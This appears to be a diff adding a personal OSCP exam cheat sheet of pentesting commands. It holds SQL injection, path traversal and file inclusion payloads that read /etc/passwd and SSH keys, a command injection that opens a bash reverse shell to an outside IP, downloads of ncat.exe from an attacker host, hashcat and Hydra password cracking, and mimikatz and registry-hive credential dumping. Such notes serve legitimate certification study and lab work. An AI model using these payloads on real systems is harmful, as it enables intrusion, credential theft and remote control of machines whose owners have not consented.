@@ -1,0 +1,116 @@
+OSCP AD Guide
+https://github.com/LeonardoE95/OSCP
+https://blog.leonardotamiano.xyz/tech/oscp-technical-guide/
+https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x
+
+
+Pivoting:
+chisel 
+
+#SQL Injection
+ ' OR 1=1 --
+  1 UNION SELECT first_name, password FROM users #
+
+#Directory Traversals
+
+http://target.com/vuln?page=../../../../../../../etc/passwd
+http://target.com/vuln?page=?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2Fwwwroot%2FWeb.config
+
+
+#Local File Inclusion (LFI)
+http://target.com/vuln?page=../../../../../../../etc/passwd
+http://target.com/vuln?page=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fleo%2F.ssh%2Fid_rsa
+
+
+#Remote File Inclusion (RFI)
+http://target.com/vuln?page=http://192.168.50.51/reverse.py
+
+#OS command injections
+http://target.com/vuln?ping=192.168.50.51 ; bash -i >& /dev/tcp/192.168.50.51/1337 0>&1
+
+#Cross-Site Scripting (XSS)
+<script> alert(1); </script>
+
+#Enumeration Tools in Linux:
+	1. linPEAS 
+	2. LinEnum
+
+#Enumeration Tools in Windows:
+	1. winPEAS
+	2. PrivescCheck
+
+PrintSpoofer exploit, or 
+the GodPotato exploit
+
+#File upload
+python3 -m http.server 1337
+
+certutil -urlcache -split -f "http://192.168.45.170:1337/ncat.exe" ncat.exe
+iwr -uri http://192.168.45.170:1337/ncat.exe -Outfile ncat.exe
+
+#KeePass database
+ keepass2john Database.kdbx > keepass.hash
+ hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
+
+	#ssh key
+		ssh2john id_rsa > ssh.hash
+  		hashcat -m 22921 ssh.hash rockyou.txt --force
+
+#Hashcat
+NTLM hash
+hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
+
+Net-NTLMV2 hash
+hashcat -m 5600 paul.hash rockyou.txt --force
+
+AS-REP hash
+sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
+
+Kerberoasting hash
+sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
+
+#Hydra
+hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
+
+
+#Port Forwarding and Pivoting
+
+       network 1               network 2
+kali <---------------> MS01  <--------------> MS02
+                             <--------------> DC01
+
+	Tools user:
+		ssh
+		sshutle
+		plink
+		netsh
+
+	Preference: 
+		ssh
+		chisel
+
+	Four different port forwarding techniques
+		Local Port Forwarding
+		Dynamic Port Forwarding
+		Remote Port Forwarding
+		Remote Dynamic Port Forwarding
+
+#Microsoft Word Macros
+
+
+#crackmapexec
+  crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD
+  crackmapexec smb IP -u USERNAME -H NTLM-HASH
+
+#evil-winrm
+	evil-winrm -i IP -u USERNAME -p PASSWORD
+
+#mimikatz
+./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
+
+	reg save hklm\sam sam.hiv
+  	reg save hklm\security security.hiv
+  	reg save hklm\system system.hiv
+  	./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
+
+
